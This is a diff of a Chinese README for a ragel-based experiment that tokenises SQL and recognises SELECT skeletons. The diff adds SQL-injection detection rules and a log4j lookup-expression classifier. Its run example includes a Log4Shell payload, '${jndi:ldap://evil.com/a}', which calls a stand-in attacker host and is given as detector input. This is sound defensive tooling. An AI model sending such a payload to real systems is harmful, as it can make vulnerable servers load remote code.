@@ -1,60 +1,60 @@
 # sql_ragel
 
-用 ragel 把 SQL 语法写成状态机的小实验。输入一条 SQL，先用词法切出 token，
-再在 token 流上跑语法骨架，识别 `expr` / `select_stmt` / `constant_value`。
-`select_stmt` 能整条覆盖输入时，说明输入是一条结构完整的 SELECT 语句。
+用 ragel 把语法写成状态机的小实验。输入先走词法切 token，再在 token 流上跑状态机，识别 SQL 骨架、SQLi 攻击特征和 log4j 查找表达式。
+
+## 内容
+
+- `rule_sql`：SQL 语法骨架，识别 `expr` / `select_stmt` / `constant_value`。
+- `sqli_rules`：24 条 SQLi 攻击规则（恒真条件、布尔注入、UNION/堆叠、危险函数、子查询、语句片段等）。
+- `log4j_lookup`：识别 `${...}` 表达式，按前缀归约分类 JNDI / SENSITIVE / CHAIN / EXPR。
 
 ## 目录
 
 ```
-rules/ragel/        规则源（.rl + 配套 .h）
-  sql_tokens.rl     词法：SQL 文本 -> token 流
-  rule_sql.rl       语法骨架：expr / select_stmt / constant_value
-sql_scan.c          驱动：打印 token 流和各骨架的最长命中
-test.sh             骨架断言
-CMakeLists.txt      构建入口（产物在 build/ragel/）
-Makefile            不依赖 cmake 的等价构建
-misc/               历史归档（早期 ANTLR4 后端等）
+rules/ragel/         规则源（.rl + .h）
+  sql_tokens.rl      词法：SQL 文本 -> token 流
+  rule_shared.rl     公共片段：token 编号 / 运算符 / expr 规则链
+  rule_sql.rl        SQL 语法骨架
+  sqli_rules.rl      SQLi 攻击规则
+  log4j_lookup.rl    log4j 查找表达式
+sql_scan.c           驱动：打印 token 流和骨架命中
+examples/            调用示例
+  sqli_scan.c        sqli 驱动
+  log4j_scan.c       log4j 驱动
+  test_sqli.sh       sqli 断言
+  test_log4j.sh      log4j 断言
+test.sh              sql 骨架断言
+Makefile             构建（make / make test）
+CMakeLists.txt       等价 cmake 构建
+misc/                历史归档（ANTLR4 后端等）
 ```
 
 ## 构建与测试
 
-需要 ragel 和 gcc/cmake。
+需要 ragel 和 gcc。
+
+```
+make -j        # 构建 sql_scan / sqli_scan / log4j_scan
+make test      # 跑三套断言（sql 骨架 / sqli / log4j）
+```
+
+cmake 等价：
 
 ```
 cmake -S . -B build && cmake --build build -j
-make -j                # 或直接用 Makefile，产物一致
-make test              # 跑 test.sh 断言
+cmake --build build --target validate_ragel
 ```
 
 ## 运行
 
 ```
-./build/ragel/sql_scan 'SELECT * FROM users WHERE 1=1'
-./build/ragel/sql_scan 'SELECT * FROM (SELECT id FROM t) WHERE 1=1'
+./build/ragel/sql_scan  'SELECT * FROM users WHERE 1=1'
+./build/ragel/sqli_scan '1=1 OR 1=2'
+./build/ragel/log4j_scan '${jndi:ldap://evil.com/a}'
 ```
-
-输出示例：
-
-```
-input: SELECT * FROM (SELECT id FROM t) WHERE 1=1
-tokens(13): SELECT STAR FROM LPAREN SELECT IDENT FROM IDENT RPAREN WHERE NUMBER EQ NUMBER
-  expr [10,13)
-  select_stmt [0,13) (whole)
-```
-
-`(whole)` 表示 `select_stmt` 覆盖了全部 token，即一整条 SELECT。
 
 ## 说明
 
-- 规则改动只需编辑 `.rl` 重新构建，生成 C 是中间产物，不要手工改。
-- `sql_scan.c` 只 include 头（`sql_tokens.h` / `rule_sql.h`）并链接
-  `libragel_sql.a`，不直接接触生成的 `.c`。
-- 递归（括号嵌套、子查询）由 ragel 的 fcall/fret 实现，细节见
-  `rules/ragel/rule_sql.rl` 头注释。
-
-## 历史
-
-早期实现过一套 ANTLR4 后端（.g4 -> 插件 -> engine），已归档到
-`misc/archive_antlr4/`，不参与构建。sqli / log4j 相关的 ragel 实验在
-精简为"单条 SQL 识别"时移除。
+- 规则只改 `.rl`，重新构建即可；生成的 C 是中间产物，不要手工改。
+- 驱动只 include 头文件并链接 `libragel_sql.a`，不接触生成的 `.c`。
+- 递归（括号嵌套、子查询）用 ragel 的 fcall/fret 实现，见各 `.rl` 头注释。
